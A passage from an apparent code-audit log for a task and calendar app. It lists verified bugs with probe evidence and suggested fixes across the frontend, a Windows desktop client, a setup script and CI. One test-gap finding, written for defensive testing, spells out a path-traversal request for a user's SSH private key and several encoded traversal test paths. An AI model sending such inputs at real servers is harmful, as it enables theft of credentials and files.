holds while most tasks are unplaced — after the first drag it is inverted, and a task
due today lands under tasks due next month. The same interaction silently changes the
meaning of `completedTasks` (TasksView.tsx:302) and Home's `completed` module, which
reverse `sortTasks(...)` intending "most-recent due first" and after a drag reverse the
manual order instead.

<details><summary>Evidence</summary>

```
data.tsx:456-457
  // Paint the new positions locally ...
  const next = placed.map((t, i) => ({ ...t, sort_order: i + 1 }))
order.ts:  const manual = nullsLast(a.sort_order ?? null, b.sort_order ?? null, (x, y) => x - y)
            if (manual) return manual   // due date is never reached once both are placed

Verified against the real components (vitest probe, list view):
  tasks Alpha(due 2026-09-01), Bravo(09-02), Charlie(09-03)
  before          -> ["Alpha","Bravo","Charlie"]
  drag Charlie over Alpha -> ["Charlie","Alpha","Bravo"]   (all three now carry sort_order 1..3)
  quick-add "URGENT today" with due 2026-08-01 (a month before everything else)
  after create    -> ["Charlie","Alpha","Bravo","URGENT today"]
The new, most-urgent task is last, and stays last after the server round-trip because the server also returns sort_order: null for it. Nothing in the suite covers create-after-reorder.
```

</details>

**Suggested fix.** Give a new task a position instead of leaving it null — e.g. have `create`/`draftTask`
assign `sort_order` = min(existing)-1 (top) or max+1 (bottom) whenever any task on the
account already has one, and have the backend do the same on POST /tasks so the two
agree. Alternatively make the comparator treat null as "unplaced, fall back to due date"
by interleaving on due date rather than sorting all nulls after all placed rows. Either
way add a test that a task created after a reorder lands in due order, not at the end.

#### [x] A failed GET /api/lists still marks the lists "loaded", so list-scoped settings are pruned against the stale disk cache and the loss is written to the server

`frontend/src/components/TasksView.tsx:91` · **medium** · bug · `minor`

The prune effects are gated on `listsLoaded`, documented as "the lists fetch has
returned at least once this session … the initial empty state must not wipe prefs before
the lists arrive, and neither must the cached seed". But `listsLoaded` is set in a
`.finally()` (data.tsx:155) that runs on the failure path too, while `lists` still holds
the disk-cached seed. So one failed `GET /api/lists` — Radicale down/slow, a 5xx, a
network blip — flips the gate, the effect runs against a snapshot that can predate lists
created elsewhere, and every id it cannot see is dropped from `hidden_lists`, from
`task_groups` membership, from `collapsed_groups`, and (CalendarView.tsx:251, same gate)
from `calendar_task_lists`. Each of those is immediately PUT to the server by App's
`changeHiddenLists` / `changeTaskGroups` / `changeCalTaskLists`, so the loss is
permanent rather than a transient render.

<details><summary>Evidence</summary>

```
data.tsx:152-156
  guard(async () => {
    const ls = await api.lists()
    if (Array.isArray(ls)) setLists(ls)
  }).finally(() => setListsLoaded(true))      // runs on rejection too
TasksView.tsx:90-101
  if (!listsLoaded || !lists.length) return
  const ids = new Set(lists.map((l) => l.id))
  const keptHidden = hiddenLists.filter((id) => ids.has(id))
  if (keptHidden.length !== hiddenLists.length) onHiddenListsChange(keptHidden)
  ... groups.map(g => ({ ...g, lists: g.lists.filter(id => ids.has(id)) }))

Probe against the real components (vitest): disk cache seeded with one list `l1`; api.lists rejects; props hiddenLists=['l-elsewhere'], groups=[{id:'g1',name:'Home',lists:['l-elsewhere']}]:
  onHiddenListsChange called with []
  onGroupsChange   called with [{"id":"g1","name":"Home","lists":[]}]
So a list created in another browser/CalDAV client, grouped and opted onto the calendar, has its grouping and calendar opt-in erased account-wide by a transient API failure. The existing guard test (TasksView.test.tsx:991 'does not prune list-scoped settings against a cached snapshot') mocks a promise that never settles, so it never exercises the rejection path.
```

</details>

**Suggested fix.** Set the flag only when a real list array actually landed: move `setListsLoaded(true)`
inside the guarded async body next to `if (Array.isArray(ls)) setLists(ls)` (and do the
same for the calendars' `loaded` at data.tsx:497, which gates CalendarView's identical
hidden/archived prune). Add a regression test that a rejected `api.lists()` leaves
hidden_lists, task_groups and calendar_task_lists untouched.

#### [x] A drag started inside the inline "add subtask" field reorders the parent task

`frontend/src/components/TasksView.tsx:521` · **medium** · bug · `minor`

`TaskGroup`'s reorder wrapper is `draggable` and its `onDragStart` / `onDrop` are
attached to the whole subtree — including the `InlineCreate` text input rendered inside
it when "+ sub" is pressed (TasksView.tsx:542-548). `dragstart` bubbles, so a drag begun
anywhere inside that input arms the reorder with the PARENT row's uid, overwrites the
drag payload with it, and any subsequent drop on another row commits a real `POST
/api/tasks/reorder`. The handler never checks `e.target`, so there is nothing to
distinguish "the user grabbed the row" from "the user tried to select or move text in
the subtask box".

<details><summary>Evidence</summary>

```
TasksView.tsx:520-530
  draggable={!!drag}
  onDragStart={drag && ((e) => {
    drag.onStart(task.uid)                 // no check of e.target
    e.dataTransfer.effectAllowed = 'move'
    e.dataTransfer.setData('text/plain', task.uid)
  })}
  ...
  onDrop={drag && ((e) => { e.preventDefault(); drag.onDrop(task.uid) })}
TasksView.tsx:542-548 renders <InlineCreate placeholder="Subtask" …/> inside that same wrapper.

Probe against the real component (vitest): rows Alpha, Bravo; click "+ sub" on Alpha; fire dragstart on the 'Subtask' input; drop on Bravo's wrapper ->
  api.reorderTasks called with [{"list":"l1","uid":"b"},{"list":"l1","uid":"a"}]
  dataTransfer.setData received ["text/plain","a"]  (the typed text is replaced by the uid)
So typing a subtask and then dragging within the field silently moves the parent task in the manual order — a write to the sidecar the user never asked for. (Browsers also let a draggable ancestor win over text selection inside a child input, which is how a user hits this without ever intending a drag.)
```

</details>

**Suggested fix.** Put `draggable={false}` on the InlineCreate wrapper (and on any other editable
descendant), and/or bail out of `onDragStart` when the event target is not the row
itself — e.g. `if ((e.target as HTMLElement).closest('input, textarea, select')) {
e.preventDefault(); return }`. Add a test asserting a dragstart from the subtask input
does not call api.reorderTasks.

#### [x] Calendar chips key on the bare UID, so the same UID in two collections yields duplicate React keys

`frontend/src/components/CalendarView.tsx:470` · **low** · rendering · `minor`

Events from every calendar are merged into one array
(`per.filter(Array.isArray).flat()`, data.tsx:533) and the DTO's `id` is just the UID
(or `uid::recurrence_id`) with no collection component (service.py:452/484). Tasks from
every list are merged the same way and chips key on `t.uid`. CalDAV UIDs are unique per
collection, not per account — copying an event or task between two collections in
Thunderbird/Apple Calendar preserves the UID, and the trust model treats those clients
as equal-rights writers — so two chips in the same day cell can carry the same key.
HomeView already keys defensively (`key={`${t.list}:${t.uid}`}`, HomeView.tsx:357); the
calendar grid, its mobile dots and the day popover do not. The same UID-only identity
also makes `applyLocal`/`del` (CalendarView.tsx:268, 330) act on both copies: deleting
the Work copy removes the Personal copy from the grid until a refetch lands.

<details><summary>Evidence</summary>

```
CalendarView.tsx:470  <div key={e.id} className={`cal-ev …`}>      // e.id === uid for a non-recurring event
CalendarView.tsx:505  <div key={t.uid} className={`cal-task …`}>
CalendarView.tsx:457/460 (mobile dots) and DayPopover.tsx:103/106 use the same keys.

Probe against the real component (vitest): two calendars c1 and c2, each holding an event with uid 'shared' on 2026-03-04 ->
  React: "Warning: Encountered two children with the same key" (once per render pass)
  chips: 2, chips after month nav: 2
Both chips paint, but React's keyed reconciliation maps updates to the wrong fiber (the duplicate is dropped from the key map and torn down/recreated on every update), and `applyLocal(uid, body)` (CalendarView.tsx:268) repaints BOTH copies when only one was edited.
```

</details>

**Suggested fix.** Key by collection + id, as HomeView already does: `key={`${e.calendar}:${e.id}`}` for
events and `key={`${t.list}:${t.uid}`}` for tasks, in the cell, the mobile dots, the
agenda and DayPopover. (Scoping `applyLocal`/`del` to the event's own calendar href is
the follow-on fix for the same identity confusion.)

### Modals, scheduling + appearance

#### [x] TaskModal's scrim is an onClick handler, so a text drag-select released outside the modal closes it and discards the whole form

`frontend/src/components/TaskModal.tsx:118` · **medium** · rendering · `minor`

The task form's backdrop is `<div className="overlay" onClick={onClose}>` with the inner
`.modal` calling `e.stopPropagation()`. stopPropagation on the modal only helps when the
click's *target* is inside the modal. Per the UI Events spec (and
Chrome/Firefox/Safari), a `click` is dispatched on the nearest common inclusive ancestor
of the mousedown and mouseup targets — so mousedown inside the Notes textarea and
mouseup on the backdrop dispatches `click` with `target === .overlay`, which reaches
`onClose` directly and never passes through the modal's stopPropagation. `.overlay` is
`position: fixed; inset: 0; padding: 20px` around a 520px `.modal` (app.css:455-458), so
there is a large drop zone on every side. The modal has no dirty check and no
confirmation: onClose just unmounts it (TasksView.tsx:453 `setDetail(null)`,
TasksView.tsx:464 `setAdding(null)`, CalendarView.tsx:570), so every unsaved edit is
gone. This exact failure mode is already known in this codebase —
AddMultipleModal.tsx:396-400 comments it and uses a target-checked `onMouseDown`
instead, as does AppearancePanel.tsx:150 — but TaskModal, the most-opened modal in the
app (task edit and task create, from both the Tasks and Calendar tabs), still uses the
unsafe form.

<details><summary>Evidence</summary>

```
frontend/src/components/TaskModal.tsx:117-121
```tsx
    <div className="overlay" onClick={onClose}>
      <div className="modal task-modal" role="dialog" aria-modal="true"
        aria-label={creating ? 'Add task' : 'Task'}
        onClick={(e) => e.stopPropagation()}>
```
Contrast frontend/src/components/AddMultipleModal.tsx:395-400, which documents the bug and avoids it:
```tsx
    // Target-checked mousedown, not a click on the overlay: with this many
    // inputs, a text drag-select that ends outside the modal would otherwise
    // close it and lose everything typed.
    <div className="overlay"
      onMouseDown={(e) => { if (e.target === e.currentTarget && !busy) onClose() }}>
```
Failure scenario: open a task, type three paragraphs into Notes, then double-click a word in Notes and drag left to extend the selection past the modal's left edge (the modal is 520px wide inside a full-viewport scrim, so the edge is ~20px away on a narrow window and hundreds of px away on a wide one) and release. mousedown target = the textarea, mouseup target = .overlay, so the browser fires `click` on .overlay; `onClose()` runs; `setDetail(null)` unmounts TaskModal; every keystroke is lost with no prompt. Same for a create: the title/notes/tags typed into 'Add task' vanish. No test covers TaskModal dismissal at all (TasksView.test.tsx only exercises the Save path).
```

</details>

**Suggested fix.** Replace the scrim handler with the target-checked mousedown form already used elsewhere:
`<div className="overlay" onMouseDown={(e) => { if (e.target === e.currentTarget)
onClose() }}>` and drop the now-redundant `onClick={(e) => e.stopPropagation()}` on
`.modal`. Apply the same change to the other `onClick={onClose}` scrims that sit over
unsaved form state — SchedulingView.tsx:235 and CalendarView.tsx:728. Add a test that a
mousedown on the modal body followed by a click whose target is the overlay does not
call onClose.

#### [x] The booking-link editor has no in-flight guard, so a double-click (or a second Enter) on "Create link" publishes two live booking links

`frontend/src/components/SchedulingView.tsx:348` · **medium** · bug · `minor`

`LinkModal`'s save button is `disabled={!valid}` and nothing else, and the Enter key in
the Title field calls the same `save()` (SchedulingView.tsx:246). `save()` calls
`onSave(...)`, which is SchedulingView's `save` (line 68) — an async function that only
calls `setEditing(null)` *after* the request resolves. So while
`api.createSchedulingLink` is in flight the modal stays open, the button stays enabled,
and a second activation fires a second POST. Unlike task and event creates,
`createSchedulingLink` carries no `client_id` (api.ts:355 vs api.ts:315/333), so the
backend has no idempotency key to collapse the two — each POST mints its own token and
its own row. Every other submit surface in this app guards: BookingPage.tsx:83 (`if
(!slot || busyNow) return`) plus a disabled button, AddMultipleModal.tsx:319 (`if
(!live.length || busy) return`), Login.tsx:127 (`disabled={busy}`).

<details><summary>Evidence</summary>

```
frontend/src/components/SchedulingView.tsx:218-232 and 348-350:
```tsx
  const save = () => {
    if (!valid) return
    onSave({ title: title.trim(), ... }, link?.token)
  }
...
          <button className="btn" disabled={!valid} onClick={save}>
            {link ? 'Save' : 'Create link'}
          </button>
```
and SchedulingView.tsx:68-76, which is the only place the modal is closed:
```tsx
  const save = async (body: BookingLinkInput, token?: string) => {
    const saved = await guard(() => token
      ? api.patchSchedulingLink(token, body)
      : api.createSchedulingLink(body))
    if (saved) { setLinks(...); setEditing(null) }
  }
```
Failure scenario: owner fills in "30-minute intro call", presses Enter in the Title field and — seeing nothing happen because the POST is still in flight — presses Enter again (or double-clicks "Create link", which is what users do with buttons that give no feedback). Two POSTs go out; both succeed; `setLinks` appends both; the Scheduling list now shows two identical "30-minute intro call" cards with two different public tokens, both live and bookable. The owner has to notice and delete one, and any URL already copied may point at the one they delete. The same double-fire on an existing link (PATCH) is harmless, so the bug only shows on the create path — the one that is not idempotent.
```

</details>

**Suggested fix.** Widen the prop to `onSave: (body: BookingLinkInput, token?: string) => Promise<void>`
(SchedulingView's `save` is already async), add `const [saving, setSaving] =
useState(false)` to LinkModal, make `save()` bail on `saving`, set it around the await,
and use `disabled={!valid || saving}` with a "Saving…" label. Add a test that two rapid
clicks on "Create link" issue exactly one `createSchedulingLink` call.

#### [x] The booking-link editor breaks the modal contract every other modal keeps: no Escape, no dialog role, and an onClick scrim over the app's longest form

`frontend/src/components/SchedulingView.tsx:235` · **low** · rendering · `minor`

`LinkModal` is the largest form in the app — title, description, calendar, duration,
timezone, seven days of availability ranges, three numeric fields — and it is the only
modal with none of the three dismissal/announcement conventions the rest of the app
follows. (1) No Escape handler anywhere in SchedulingView.tsx, unlike
AddMultipleModal.tsx:279, AppearancePanel.tsx:49, ArchivedCalendarsModal.tsx:140,
ConnectionsModal.tsx:25, TabsModal.tsx:28, DayPopover.tsx:85. (2) The inner `<div
className="modal sched-modal">` carries no `role="dialog"`, no `aria-modal`, no `aria-
label`, so a screen reader announces it as an anonymous group and does not scope
navigation to it — every other modal sets all three. (3) The scrim is
`onClick={onClose}`, which discards the entire form on a drag-select released outside
the modal, by the same mechanism as finding #1. ArchivedCalendarsModal.tsx:164 shares
defect (2).

<details><summary>Evidence</summary>

```
frontend/src/components/SchedulingView.tsx:234-240:
```tsx
    <div className="overlay" onClick={onClose}>
      <div className="modal sched-modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-head">
          <span className="modal-title">{link ? 'Edit booking link' : 'New booking link'}</span>
          <button className="icon-btn" onClick={onClose}>✕</button>
```
Compare ConnectionsModal.tsx:54, TabsModal.tsx:49-50, AddMultipleModal.tsx:401-402, all of which set `role="dialog" aria-modal="true" aria-label=…`; and the ✕ here has no `aria-label` either, so it reads as the button "✕".
Failure scenarios: (a) the owner edits a link's weekly availability, drags to select the description text, releases past the modal edge — the modal closes and every range edit is gone with no prompt; (b) the owner presses Escape to back out of "New booking link" and nothing happens, unlike in Tabs/Appearance/Connections/Archived/Add-multiple; (c) a screen-reader user gets no "dialog" announcement and can tab straight out into the page behind the scrim.
```

</details>

**Suggested fix.** In LinkModal, add the standard Escape effect (`window.addEventListener('keydown', …)`
closing on `e.key === 'Escape'`), set `role="dialog" aria-modal="true" aria-label={link
? 'Edit booking link' : 'New booking link'}` on `.modal`, give the ✕ an `aria-
label="Close"`, and switch the scrim to the target-checked `onMouseDown` form used by
AddMultipleModal.tsx:399. Add `role`/`aria-modal`/`aria-label` to
ArchivedCalendarsModal.tsx:164 as well.

#### [x] The appearance validator accepts any 3–20 letter word as a color, so a misspelled or invented color name is stored and applied as an override that silently blanks the property

`frontend/src/appearance.ts:289` · **low** · bug

`isColor` short-circuits on `/^[a-z]{3,20}$/i` with the comment "A bare keyword:
transparent, currentColor, a named CSS color" — but the regex tests the *shape* of a
word, not membership in the CSS named-color set. Any alphabetic 3–20 char string passes:
`cream`, `sand`, `charcoal`, `offwhite`, `purpel`, and the CSS-wide keywords
`inherit`/`unset`/`revert`. `isValidToken` therefore returns true, so `ColorControl`
never applies its `bad` class (AppearancePanel.tsx:303), `onChange` fires, the value is
written into the theme, mirrored to localStorage (`cacheAppearance`), PUT to the
account, and applied by `applyTokens` — `sanitizeTokens` re-runs the same permissive
check, so nothing downstream catches it either. In the CSSOM the custom property holds
the garbage token happily; the breakage lands one level down, where `var(--bg)` /
`var(--accent)` substitutes into `background`/`color` and produces a declaration that is
invalid at computed-value time, i.e. dropped. The editor reports the value as good, the
↺ button lights up as a real override, and the counter says "1 override in light" —
while the app renders as if the token had no value at all.

<details><summary>Evidence</summary>

```
frontend/src/appearance.ts:286-301:
```ts
function isColor(v: string): boolean {
  if (/^#[0-9a-f]{3,8}$/i.test(v)) return true
  // A bare keyword: `transparent`, `currentColor`, a named CSS color.
  if (/^[a-z]{3,20}$/i.test(v)) return true
```
Failure scenario: Settings → Appearance → Surfaces → Background, type `cream` (7 letters, no forbidden chars, under MAX_VALUE_LEN). `isValidToken('--bg','cream')` → `isColor` hits the bare-keyword branch → true. The field renders without the `bad` class, `edit({'--bg':'cream'})` forks a theme, and `applyTokens` runs `documentElement.style.setProperty('--bg','cream')`. `body { background: var(--bg) }` resolves to `background: cream`, which is not a valid <color>, so the declaration is invalid at computed value time and background falls back to the initial value (transparent) — the page paints on the browser's default canvas, the value survives a reload via localStorage and the account settings, and the panel keeps insisting the override is valid. Same for a typo in Accent (`purpel`), which drops `background: var(--accent)` off every primary button. appearance.test.ts has no case for a non-existent color name; its validation tests only cover the forbidden-charset and the function allowlist.
```

</details>

**Suggested fix.** Make the bare-keyword branch check membership rather than shape. Cheapest correct check
in a browser: `if (/^[a-z]+$/i.test(v)) return CSS.supports('color', v)` (falling back
to a small named-color set when `CSS.supports` is unavailable, so jsdom tests stay
deterministic). The module already has a parseability oracle in `toSwatchHex` (canvas
`fillStyle` ignores an unparseable value), which can be reused. Add appearance.test.ts
cases asserting `isValidToken('--bg','cream')` and `isValidToken('--accent','purpel')`
are false while `rebeccapurple`/`transparent`/`currentColor` stay true.

### Desktop client + deploy

#### [x] Any failure during the update download kills startup even though a complete installed build is sitting on disk

`desktop/Smylte.Desktop/Updater.cs:75` · **medium** · bug · `minor`

`EnsureWebAssetsAsync` wraps only `FetchReleaseAsync` in a try/catch, with an explicit
comment that "an installed client must still open" when the network is unavailable
(lines 46-55). `DownloadAndSwapAsync` at line 75 is outside that guard, so every failure
after the release JSON has been fetched propagates out of the method: an
`HttpRequestException`/`IOException` when the connection drops mid-download (the client
is downloading megabytes with a 5-minute timeout), an `InvalidDataException` from
`ZipFile.ExtractToDirectory` on a truncated or corrupt zip, an `IOException` from
`Directory.Delete`/`Directory.Move` when Windows Defender or an open Explorer window has
a handle on `<data>\web`. MainForm.InitialiseAsync's catch-all (MainForm.cs:150) turns
any of these into `Fail(ex.Message, offerSetup: true)` — an error dialog offering the
setup form, and then `Close()`. The user cannot open their tasks at all, despite a fully
working build in `settings.WebRoot`. Flaky wifi mid-download is an everyday trigger, and
the failure mode is the exact opposite of the one the code deliberately handles two
branches above.

<details><summary>Evidence</summary>

```
desktop/Smylte.Desktop/Updater.cs:38-75

    var haveLocal = File.Exists(Path.Combine(settings.WebRoot, "index.html"));
    try { release = await FetchReleaseAsync(settings, ct)...; }
    catch (Exception ex) when (ex is HttpRequestException or TaskCanceledException)
    {
        if (haveLocal) return new UpdateResult(false, "Offline — using the installed build.", false);
        ...
    }
    ...
    log.Report("Downloading the latest build…");
    await DownloadAndSwapAsync(settings, id, log, ct).ConfigureAwait(false);   // <- unguarded

MainForm.cs:150-153

    catch (Exception ex)
    {
        Fail(ex.Message, offerSetup: true);   // -> MessageBox -> Close()
    }

Failure scenario: user has run the client for weeks (`<data>\web\index.html` present, working). A new build is published; on launch the release fetch succeeds over a marginal connection, then the wifi drops 40 MB into the asset download. `CopyToAsync` throws `IOException: Unable to read data from the transport connection`. Instead of the intended "Offline — using the installed build", the user gets "Unable to read data from the transport connection.\n\nOpen settings?" and the window closes. Identical outcome for a zip that fails to extract, which is also the path a partially-written temp file takes on the retry.
```

</details>

**Suggested fix.** Wrap the download/swap in the same shape as the fetch:
try { await DownloadAndSwapAsync(settings, id, log, ct).ConfigureAwait(false); }
catch (Exception ex) when (haveLocal && ex is HttpRequestException or
TaskCanceledException or IOException or InvalidDataException or
UnauthorizedAccessException)     {         return new UpdateResult(false, "Could not
install the update — using the installed build.", clientOutdated);     }
Leave the rethrow in place for `!haveLocal` (a first run genuinely has nothing to fall
back to), and do not update `LastAssetId`/`LastAssetStamp` on that path so the next
launch retries.

#### [x] An update interrupted between the two directory moves strands the only working build in web.old, and nothing ever restores it

`desktop/Smylte.Desktop/Updater.cs:207` · **medium** · bug · `minor`

The swap moves `web` -> `web.old`, then `web.new` -> `web`, with a comment asserting "a
failure between the two steps still leaves a working install to roll back to". The
rollback only exists for an in-process exception from the second `Directory.Move` (lines
212-215). If the process dies between the two moves — the user closes the window,
Windows shuts down, the app is killed, a crash — there is no `web` at all and no code
path anywhere that looks at `web.old`. On the next launch `haveLocal` is `false` (line
38), so the client is now dependent on reaching GitHub; if it cannot, it throws "Could
not reach GitHub to download the app, and there is no local copy yet" and refuses to
start, with a complete build sitting one rename away. Worse, the *first* thing
`DownloadAndSwapAsync` does when it does succeed in downloading is delete `previous`
(lines 199-200), so the good copy is destroyed rather than used.

<details><summary>Evidence</summary>

```
desktop/Smylte.Desktop/Updater.cs:196-218

    var staging  = root + ".new";
    var previous = root + ".old";

    foreach (var stale in new[] { staging, previous })
        if (Directory.Exists(stale)) Directory.Delete(stale, recursive: true);   // deletes the survivor
    ...
    if (Directory.Exists(root)) Directory.Move(root, previous);
    try   { Directory.Move(staging, root); }
    catch (Exception)
    {
        if (!Directory.Exists(root) && Directory.Exists(previous)) Directory.Move(previous, root);
        throw;                                   // <- only covers an in-process throw
    }

Failure scenario: an update is installing when the user hits the X (MainForm.OnFormClosing disposes the server and the process exits) or Windows begins shutdown, and the process ends after `Directory.Move(root, previous)` and before `Directory.Move(staging, root)`. Disk state: `<data>\web` absent, `<data>\web.old` = the good build, `<data>\web.new` = the new build. Next launch on a train with no signal: `haveLocal == false`, `FetchReleaseAsync` throws `HttpRequestException`, and line 51 throws `InvalidOperationException("Could not reach GitHub ... and there is no local copy yet")` -> MainForm.Fail -> the app will not open, with two intact builds on disk. Next launch with signal: line 200 deletes `web.old` (and `web.new`) and re-downloads.
```

</details>

**Suggested fix.** Recover at the top of `EnsureWebAssetsAsync`, before `haveLocal` is computed: if
`!Directory.Exists(root)` and `Directory.Exists(root + ".old")`, `Directory.Move(root +
".old", root)`; if `root` is missing but `root + ".new"` has an `index.html`, promote
that instead. Then compute `haveLocal`. Same handful of lines makes the comment on
205-206 true.

#### [x] setup.sh runs `python -m tasksd` without changing into the backend directory, so the documented install aborts before writing the env file

`deploy/setup.sh:31` · **medium** · bug · `minor`

`tasksd` is not installed into the venv — `backend/pyproject.toml` has no `[build-
system]`, `requirements.txt` lists only third-party deps, and README.md:178 creates the
venv with `python3 -m venv .venv && .venv/bin/pip install -r requirements.txt`. The
package is importable only when the current directory is `backend/`, which is why
`deploy/tasks.service` sets `WorkingDirectory=/home/nicholaskmitchell/tasks/backend`.
`setup.sh` never `cd`s anywhere, and `sudo` does not change the working directory, so
`sudo -u "$USER_NAME" "$PY" -m tasksd hash-password` inherits the caller's cwd.
docs/DEPLOY.md's own sequence is step 0 `cd ~/tasks/frontend && npm install && npm run
build`, then step A `sudo ~/tasks/deploy/setup.sh` — i.e. cwd is `~/tasks/frontend`,
where `-m tasksd` fails with `No module named tasksd`. The explicit guard added right
above catches the empty result and exits 1, so the install stops with a message
("password hashing failed — re-run setup") that points at the password prompt rather
than at the missing cwd, and re-running changes nothing. The Radicale password the user
has already typed is discarded, no env file is written, and the service is never
installed.

<details><summary>Evidence</summary>

```
deploy/setup.sh:9-34 (no `cd` between them)

    BACKEND=/home/$USER_NAME/tasks/backend
    PY=$BACKEND/.venv/bin/python
    ...
    read -rsp "Radicale password for $USER_NAME: " RADPW; echo
    ...
    if ! HASH=$(sudo -u "$USER_NAME" "$PY" -m tasksd hash-password) || [ -z "$HASH" ]; then
      echo "password hashing failed — env file not written; re-run setup" >&2
      exit 1
    fi

Reproduced (same package layout, same absence of an installed dist):

    $ cd /home/user/smylte/frontend && python3 -m tasksd hash-password
    /usr/local/bin/python3: No module named tasksd

docs/DEPLOY.md:29-34 is the flow that lands you there:

    cd ~/tasks/frontend && npm install && npm run build   # -> dist/
    ...
    sudo ~/tasks/deploy/setup.sh

Only a caller who happens to be sitting in ~/tasks/backend gets past line 31.
```

</details>

**Suggested fix.** Make the invocation independent of the caller's cwd: `if ! HASH=$(cd "$BACKEND" && sudo
-u "$USER_NAME" "$PY" -m tasksd hash-password) || [ -z "$HASH" ]; then` — or add `cd
"$BACKEND"` near the top of the script, next to the `[ -x "$PY" ]` check that already
assumes that layout. (Installing the package into the venv would fix it more thoroughly,
but the one-line cd matches how tasks.service already works.)

#### [x] Test gap: the entire Windows client ships with zero tests — CI only compiles it, leaving the proxy's path-traversal guard and cookie rewriting unverified

`desktop/Smylte.Desktop/LocalServer.cs:257` · **medium** · test-gap

There is no test project anywhere under `desktop/` and no `dotnet test` in either
workflow — ci.yml's desktop job is a single `dotnet build` whose own comment says "Build
only — there is no Windows runtime here to exercise it on", and desktop-release.yml
publishes the exe with no gate beyond compilation. Meanwhile the backend has 17 pytest
modules and the frontend 12 vitest suites, so this is the one shipped component with no
behavioural coverage at all. Three pieces of it are exactly the kind of code that fails
silently and is security-relevant: (1) `LocalServer.Resolve`'s containment check is the
only thing standing between a request path and arbitrary file reads off the user's disk,
and it is subtle — it double-decodes (`Uri.UnescapeDataString` on an already-decoded
`AbsolutePath`), relies on `Path.Combine` returning a rooted second argument unchanged,
and does an `OrdinalIgnoreCase` prefix compare after `TrimEnd`ing the separator off
`_root`; (2) `LocaliseCookie` is declared `internal` — the only `internal` member in the
assembly, which is what you do for something you intend to test — and there is no
`InternalsVisibleTo` and no test; if its regexes stop stripping `Secure` the user simply
never stays logged in, with no error; (3) the updater's move-move-delete swap has no
coverage of the interrupted-state paths at all. The README itself flags this area as
"the piece to be careful with" and notes that getting the proxy wrong "does not error —
it leaves the stream connected and permanently silent".

<details><summary>Evidence</summary>

```
desktop/Smylte.Desktop/LocalServer.cs:248-261 — the guard, untested:

    var relative = Uri.UnescapeDataString(urlPath).TrimStart('/');
    if (relative.Length == 0) relative = "index.html";
    var full = Path.GetFullPath(Path.Combine(
        _root, relative.Replace('/', Path.DirectorySeparatorChar)));
    if (!full.StartsWith(_root + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase))
        return null;

desktop/Smylte.Desktop/LocalServer.cs:199-204 — `internal`, i.e. written to be tested, and not tested:

    internal static string LocaliseCookie(string raw) { ... }

.github/workflows/ci.yml:56-66 — the whole desktop gate:

    - run: dotnet build desktop/Smylte.Desktop/Smylte.Desktop.csproj -c Release

$ grep -rn "dotnet test\|xunit\|InternalsVisibleTo" desktop .github   ->  no matches
$ find desktop -name '*Test*'                                        ->  no matches

What goes undetected: a refactor that drops the `_root + separator` suffix from the prefix compare (making `<data>\webroot-evil` match `<data>\web`), or that moves the containment check above the `Path.Combine`, turns `GET /..%2f..%2fUsers%2fnick%2f.ssh%2fid_ed25519` into a file read served to anything on loopback — and the build stays green. Likewise a change to the `CookieSecure` regex (e.g. losing `\b`) leaves `Secure` on a cookie minted for an `http://localhost` origin, so login silently never persists.
```

</details>

**Suggested fix.** Add `desktop/Smylte.Desktop.Tests/` (xunit) plus `<InternalsVisibleTo
Include="Smylte.Desktop.Tests" />` in the csproj, and wire `dotnet test` into both
workflows. Minimum coverage: (a) `Resolve` against `/`, `/index.html`, `/assets/x.js`,
`/../secret`, `/%2e%2e/secret`, `/%252e%252e/secret`, `//C:/Windows/win.ini`, and a
sibling directory sharing the root's prefix — asserting only in-root files resolve; (b)
`LocaliseCookie` over the real `Set-Cookie` the backend emits (`tasks_session=…;
HttpOnly; Secure; SameSite=strict; Path=/`) and over `SameSite=None; Secure` and a
`Domain=` form; (c) an end-to-end `LocalServer` test against a stub upstream asserting
SSE bytes arrive chunked and unbuffered — the failure the README calls out as silent.

#### [x] desktop-release.yml has no concurrency group, so an older build can clobber a newer one on the rolling release

`.github/workflows/desktop-release.yml:10` · **low** · bug · `minor`

The workflow triggers on every push to `main` and uploads with `--clobber` onto a single
rolling `desktop-latest` release. There is no `concurrency:` block, so two pushes a few
minutes apart produce two independent runs whose `release` jobs are not ordered relative
to each other — runner availability decides. If run A (older commit) reaches `gh release
upload ... --clobber` after run B (newer commit), the release ends up holding A's
`smylte-web.zip` and `Smylte.exe` while the notes say B's SHA. Every client then
installs the older build on next launch and, because `--clobber` deletes and recreates
the asset, `asset.id` and `updated_at` both change, so `EnsureWebAssetsAsync`'s
freshness check (Updater.cs:71) treats the downgrade as a normal update and records it
in `LastAssetId`. There is no version comparison anywhere in the updater, so nothing
detects that the build went backwards; the regression persists until someone pushes
again.

<details><summary>Evidence</summary>

```
.github/workflows/desktop-release.yml:10-13 and 96-104

    on:
      push:
        branches: [main]
      workflow_dispatch:
    # no `concurrency:` anywhere in the file
    ...
          if gh release view desktop-latest >/dev/null 2>&1; then
            gh release upload desktop-latest $FILES --clobber

Updater.cs:71-79 accepts whatever is there:

    if (haveLocal && id == settings.LastAssetId && stamp == settings.LastAssetStamp)
        return new UpdateResult(false, "Up to date.", clientOutdated);
    ...
    settings.LastAssetId = id;   // records the downgrade as the new baseline

Failure scenario: commit A is pushed, then commit B two minutes later (a fix on top of A). B's ubuntu jobs happen to be scheduled first and its release job finishes at T+6min; A's finishes at T+8min and clobbers. The desktop client silently reverts to the pre-fix build and reports "Updated to the latest build."
```

</details>

**Suggested fix.** Add at the top of the workflow:
concurrency:       group: desktop-release       cancel-in-progress: true
That both serialises the release job and cancels a superseded run before it can publish.

## Sweep — 2026-08-07

A second adversarial sweep (12 subsystem finders, two independent verifiers per
finding). 59 raw findings, **45 survived verification**, 14 were refuted. Merged
in are 4 findings from a first, mis-configured pass whose `args` never reached
the workflow, so it ran a single whole-repo finder instead of twelve — those are
filed under *Cross-cutting*.

Every HIGH here was additionally re-verified by hand with a runnable probe before
anything was changed. **8 fixed** in that pass (ticked below, each with a
regression test).

The remaining 41 are being closed by cluster (issues #42–#48). **Cluster #45 —
auth, session lifetime and request limits — closed 6**: the unauthenticated
body-buffering HIGH (now bounded ahead of the router by `tasksd/limits.py` and
at the edge by `deploy/Caddyfile.snippet`), the SSE stream that outlived its own
revocation, sessions surviving a credential change, the frontend logout that
reported success on a failed request, the sidecar PUT that wrote an
unreclaimable row for an unknown uid, and the SSE test gap.

**Cluster #42 — the unauthenticated booking write path — closed 6**, plus
`expand_occurrences` from #44 (the same truncation, one layer down). The three
per-link-ceiling findings were one defect in the charge accounting and got one
